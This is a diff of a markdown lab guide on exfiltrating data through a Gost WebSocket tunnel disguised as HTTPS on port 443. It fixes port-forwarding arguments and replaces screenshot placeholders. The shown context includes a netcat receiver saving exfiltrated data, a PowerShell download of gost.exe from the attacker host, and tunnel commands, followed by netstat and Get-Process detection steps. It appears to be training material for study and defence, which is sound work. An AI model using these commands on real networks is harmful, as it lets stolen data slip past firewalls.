@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
+<img width="928" height="285" alt="image" src="https://github.com/user-attachments/assets/44b51c63-00cd-4c3a-9f68-35578e0238f4" />![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)
 
 # Lab: Cloud-Based Services as Exfil using Gost
 
@@ -36,7 +36,7 @@ nc -lvnp 8080 > exfiltrated_data.csv
 - *Terminal 3:* Start Gost to listen on port 443 (simulating standard HTTPS traffic) and forward that traffic internally to our Netcat listener. (Note down your Ubuntu VM IP address before running this, you will need it later).
 
 ```bash
-sudo ./gost -L wss://:443/127.0.0.1:8080
+sudo ./gost -L wss://:443
 ```
 <img width="865" height="57" alt="image" src="https://github.com/user-attachments/assets/81e9aa3f-c810-4c2a-93b9-ae0a1f9759e9" />
 
@@ -67,7 +67,7 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\go
 - Start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.
 
 ```powershell
-& "$env:TEMP\gost.exe" -L tcp://:9000 -F wss://<UBUNTU_IP>:443
+& "$env:TEMP\gost.exe" -L tcp://:9000/127.0.0.1:8080 -F wss://<UBUNTU_IP>:443
 ```
 <img width="1199" height="96" alt="image" src="https://github.com/user-attachments/assets/244e1e26-f48c-49db-8ff8-1488fa032e30" />
 
@@ -101,8 +101,7 @@ Let's see if the firewall was bypassed successfully.
 ```bash
 cat exfiltrated_data.csv
 ```
-<img width="867" height="333" alt="image" src="https://github.com/user-attachments/assets/f0ceb50e-3cf5-4068-a847-3a8100d326df" />
-
+<img width="928" height="285" alt="image" src="https://github.com/user-attachments/assets/5f332435-1b43-473a-9196-1a2cc9aba0a9" />
 
 ---
 
@@ -114,13 +113,13 @@ Why didn't the enterprise firewall block this? Because the traffic looked like a
 ```powershell
 netstat -ano | findstr 443
 ```
-
-[Screenshot: Output-ul netstat arătând conexiunea ESTABLISHED către IP-ul de Ubuntu pe portul 443]
+<img width="769" height="274" alt="image" src="https://github.com/user-attachments/assets/2f023e8c-23f1-43f6-a8f1-d1898495dce9" />
 
 - Match the PID (Process ID) from the previous command to the actual executable. (Replace <PID> with the number from the last column of your netstat output).
 
 ```powershell
 Get-Process -Id <PID>
 ```
+<img width="733" height="130" alt="image" src="https://github.com/user-attachments/assets/3f5414a8-36b6-4303-88c5-b96ffbc6fe0e" />
 
-[Screenshot: Get-Process arătând clar că executabilul malițios 'gost' este cel care ține conexiunea deschisă]
+
